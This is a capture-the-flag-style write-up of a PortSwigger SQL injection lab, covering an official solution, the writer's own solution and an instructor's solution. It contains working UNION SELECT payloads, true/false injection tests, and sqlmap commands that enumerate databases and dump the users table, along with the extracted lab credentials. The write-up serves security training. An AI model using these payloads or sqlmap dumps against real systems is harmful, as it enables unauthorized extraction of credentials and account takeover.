
---

## **Lab: SQL Injection UNION Attack to Retrieve Data from Other Tables**

### **Lab URL**:

[https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

---

## **High-Level Summary of the Lab**

1. **Objective**: Perform a **_UNION-based SQL Injection attack_** on the product category filter to retrieve usernames and passwords from the `users` table, and log in as the administrator to solve the lab.
    
2. **What Makes This Vulnerable?**:
    
    - The application uses user-controlled input in the `category` parameter without proper sanitization, leading to a **_SQL Injection vulnerability_**.
    - This allows attackers to manipulate the query, injecting SQL commands to retrieve data from other tables in the database.
3. **Key Techniques**:
    
    - Using UNION-based SQL Injection to determine the query structure and extract sensitive data.
    - Automating payload testing using tools like **_Burp Intruder_** or **_SQLmap_**.
4. **Key Learning**:
    
    - UNION attacks can reveal sensitive data if input fields are improperly validated.
    - SQL Injection testing often involves manually verifying the attack first, then using tools for deeper exploration.

---

## **PortSwigger Solution**

1. Intercept and modify the request that sets the product category filter in **Burp Suite**.
2. Determine the **number of columns** in the query and identify which columns accept text data using the following payload:
    
    ```plaintext
    '+UNION+SELECT+'abc','def'--
    ```
    
3. Once verified, retrieve data from the `users` table using this payload:
    
    ```plaintext
    '+UNION+SELECT+username,+password+FROM+users--
    ```
    
4. Verify that the application's response contains the usernames and passwords.

---

## **Your Solution**

1. **Traffic Generation**:
    - Navigate to the web application and interact with the product categories to generate traffic in **Burp Suite**.
    - Locate the relevant GET request:
        
        ```plaintext
        GET /filter?category=Clothing%2c+shoes+and+accessories
        ```
        
2. **Payload Construction**:
    - Modify the `category` parameter with the following payload:
        
        ```plaintext
        1' UNION SELECT username, password FROM users --
        ```
        
    - The full request becomes:
        
        ```plaintext
        GET /filter?category=Clothing%2c+shoes+and+accessories1' UNION SELECT username, password FROM users -- HTTP/2
        ```
        
3. **Result**:
    - Received a **200 OK** response, and the application displayed the following usernames and passwords:
        
        ```html
        <tr><th>wiener</th><td>e0rhde6r01n2svvmpp42</td></tr>
        <tr><th>carlos</th><td>nd76dn00fy7xpm8m1ghe</td></tr>
        <tr><th>administrator</th><td>r08fng6gvgdcoxnsfsj5</td></tr>
        ```
        
4. **Completion**:
    - Used the administrator credentials (`administrator:r08fng6gvgdcoxnsfsj5`) to log in and complete the lab.

---

## **Instructor Solution**

1. **Traffic Generation**:
    
    - Navigate to the lab and generate traffic in **Burp Suite**.
    - Identify the GET request:
        
        ```plaintext
        GET /filter?category=Pets
        ```
        
    - Send the request to **Intruder** and set a positional marker on the `Pets` parameter.
2. **Payload Automation with Intruder**:
    
    - Load payloads from:
        
        ```plaintext
        /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
        ```
        
    - Ensure **URL encoding** is enabled in the Payload Encoding section to avoid breaking HTTP requests.
3. **Identifying SQL Injection**:
    
    - Filter responses by content length. A significantly longer response length (e.g., **27828**) indicates a successful payload.
    - Send the working payload to **Repeater** to simplify and manually verify the SQL Injection.
4. **SQL Injection Testing**:
    
    - Test true/false statements:
        - True:
            
            ```plaintext
            ' or 'a'='a
            ```
            
        - False:
            
            ```plaintext
            ' or 'a'='b
            ```
            
5. **Automating with SQLmap**:
    
    - Use SQLmap to automate the SQL Injection process:
        - **Step 1**: Test for vulnerabilities:
            
            ```bash
            sqlmap 'https://<lab-url>/filter?category=Pets' --dbs
            ```
            
        - **Step 2**: Enumerate tables:
            
            ```bash
            sqlmap 'https://<lab-url>/filter?category=Pets' -D public --tables --batch
            ```
            
        - **Step 3**: Dump data:
            
            ```bash
            sqlmap 'https://<lab-url>/filter?category=Pets' -D public -T users --dump --batch
            ```
            
    - Results:
        
        ```plaintext
        administrator:lzr7vlf5vf8johylrz93
        ```
        
6. **Completion**:
    
    - Use the administrator credentials (`administrator:lzr7vlf5vf8johylrz93`) to log in and complete the lab.

---

## **Why This Solution is an Example of SQL Injection**

- **What is SQL Injection?**
    
    - SQL Injection occurs when untrusted user input is directly embedded into SQL queries without proper sanitization or parameterization.
- **How is this Lab Vulnerable?**
    
    - The `category` parameter is used directly in the SQL query without validation, allowing malicious payloads to alter the query structure.
- **Key Characteristics in This Lab**:
    
    - **_Target_**: The `category` parameter in the GET request.
    - **_Exploitation_**: UNION-based SQL Injection to retrieve data from the `users` table.
    - **_Impact_**: Access to sensitive user data, including administrator credentials, enabling unauthorized access.

---

#SQLInjection #UNION #SQLmap #BurpSuite #WebSecurity #DatabaseExploitation